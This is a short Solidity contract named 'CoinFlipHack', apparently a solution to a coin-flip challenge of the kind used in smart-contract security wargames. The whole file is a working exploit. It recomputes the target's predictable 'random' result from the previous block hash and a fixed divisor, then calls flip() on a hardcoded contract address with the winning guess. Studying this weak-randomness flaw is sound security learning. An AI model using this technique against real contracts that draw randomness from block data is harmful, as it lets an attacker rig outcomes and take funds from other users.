// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {

    CoinFlip public constant FLIP_CONTRACT = CoinFlip(0x4dF32584890A0026e56f7535d0f2C6486753624f);
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return FLIP_CONTRACT.flip(side);
    }
}